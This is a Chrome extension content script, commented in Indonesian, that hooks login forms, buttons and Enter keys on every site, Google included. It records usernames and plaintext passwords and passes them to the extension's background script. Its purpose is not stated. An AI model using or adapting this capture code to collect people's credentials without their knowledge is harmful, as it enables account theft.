// Content Script — menangkap login di semua halaman termasuk Google (SPA/non-form-submit)

(function () {
  'use strict';

  const USERNAME_KEYWORDS = [
    'email', 'username', 'user', 'login', 'identifier',
    'account', 'phone', 'mobile', 'userid', 'uname', 'mail'
  ];

  // Simpan email/username yang ditemukan di step sebelumnya (khusus multi-step seperti Google)
  let savedUsername = '';

  // ── Cari field username di seluruh halaman (bukan hanya dalam form) ─────────
  function findUsernameField() {
    const all = Array.from(document.querySelectorAll(
      'input:not([type="password"]):not([type="hidden"]):not([type="submit"]):not([type="checkbox"]):not([type="radio"])'
    ));
    return all.find(el => {
      const attrs = [el.name, el.id, el.placeholder, el.autocomplete, el.type, el.getAttribute('aria-label')]
        .map(v => (v || '').toLowerCase());
      return attrs.some(val => USERNAME_KEYWORDS.some(kw => val.includes(kw)));
    });
  }

  // ── Cari field password di seluruh halaman ───────────────────────────────────
  function findPasswordField() {
    return document.querySelector('input[type="password"]');
  }

  // ── Cari tombol submit / next ────────────────────────────────────────────────
  function findSubmitButtons() {
    return Array.from(document.querySelectorAll(
      'button[type="submit"], input[type="submit"], button[jsaction], [role="button"]'
    )).filter(el => el.offsetParent !== null); // hanya yang visible
  }

  // ── Tangkap dan kirim data ───────────────────────────────────────────────────
  function capture() {
    const passwordField  = findPasswordField();
    const usernameField  = findUsernameField();

    // Jika ada field username yang terisi, simpan untuk multi-step
    if (usernameField && usernameField.value.trim()) {
      savedUsername = usernameField.value.trim();
    }

    // Hanya kirim kalau ada password
    if (!passwordField || !passwordField.value) return;

    const username = (usernameField && usernameField.value.trim())
      ? usernameField.value.trim()
      : savedUsername || 'Tidak diketahui';

    const entry = {
      id:        Date.now().toString(),
      site:      window.location.hostname,
      username:  username,
      password:  passwordField.value,
      timestamp: new Date().toLocaleString('id-ID', {
        day: '2-digit', month: '2-digit', year: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit'
      })
    };

    chrome.runtime.sendMessage({ type: 'SAVE_PASSWORD', payload: entry });
  }

  // ── Listener: form submit (situs konvensional) ───────────────────────────────
  function attachFormListeners() {
    document.querySelectorAll('form').forEach(form => {
      if (form.dataset.pwCapture) return;
      form.dataset.pwCapture = '1';
      form.addEventListener('submit', capture);
    });
  }

  // ── Listener: klik tombol submit (Google, SPA, dll) ─────────────────────────
  function attachButtonListeners() {
    findSubmitButtons().forEach(btn => {
      if (btn.dataset.pwCapture) return;
      btn.dataset.pwCapture = '1';
      btn.addEventListener('click', () => {
        // Delay sedikit agar nilai field sudah final sebelum diambil
        setTimeout(capture, 100);
      });
    });
  }

  // ── Listener: Enter di field password ───────────────────────────────────────
  function attachKeydownListeners() {
    document.querySelectorAll('input[type="password"]').forEach(el => {
      if (el.dataset.pwCapture) return;
      el.dataset.pwCapture = '1';
      el.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') setTimeout(capture, 100);
      });
    });

    // Pantau field username untuk multi-step (simpan ke background session)
    const usernameField = findUsernameField();
    if (usernameField && !usernameField.dataset.pwCapture) {
      usernameField.dataset.pwCapture = '1';

      function saveUsernameToBackground() {
        const val = usernameField.value.trim();
        if (!val) return;
        savedUsername = val;
        chrome.runtime.sendMessage({
          type:     'SAVE_USERNAME',
          site:     window.location.hostname,
          username: val
        });
      }

      usernameField.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') saveUsernameToBackground();
      });
      usernameField.addEventListener('blur', saveUsernameToBackground);
    }
  }

  // ── Attach semua listener ────────────────────────────────────────────────────
  function attachAll() {
    attachFormListeners();
    attachButtonListeners();
    attachKeydownListeners();
  }

  // Jalankan saat load
  attachAll();

  // MutationObserver untuk SPA yang render elemen belakangan (React, Angular, Vue)
  const observer = new MutationObserver(() => attachAll());
  observer.observe(document.body || document.documentElement, {
    childList: true,
    subtree:   true
  });

  // Simpan username sebelum navigasi (multi-step seperti Google)
  window.addEventListener('beforeunload', () => {
    const uField = findUsernameField();
    if (uField && uField.value.trim()) {
      // Simpan ke sessionStorage agar tersedia di halaman berikutnya
      try { sessionStorage.setItem('__pw_ext_user', uField.value.trim()); } catch (_) {}
    }
  });

  // Ambil username dari step sebelumnya jika ada
  try {
    const stored = sessionStorage.getItem('__pw_ext_user');
    if (stored) savedUsername = stored;
  } catch (_) {}

})();
